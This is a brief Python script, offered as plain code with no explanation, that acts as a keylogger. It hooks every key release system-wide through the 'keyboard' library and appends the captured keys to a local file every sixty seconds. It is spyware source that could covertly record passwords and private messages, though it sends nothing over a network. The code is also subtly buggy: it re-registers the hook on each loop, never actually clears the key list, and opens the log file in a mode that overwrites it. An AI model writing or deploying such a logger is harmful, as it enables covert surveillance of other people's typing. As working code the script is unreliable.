import keyboard
import time

INTERVAL_TIME = 60 # set timer to write to log file after x seconds
OUTFILE = "log.txt" # set output file
keys = []

def log(keys):
    with open(OUTFILE, "r+") as file:
        for i in keys:
            file.write(i) # write logged keys to output file
        keys = [] # reset the key list
        file.close() # close the file

while True:
    keyboard.on_release(lambda e: keys.append(e.name))
    time.sleep(INTERVAL_TIME)
    log(keys)

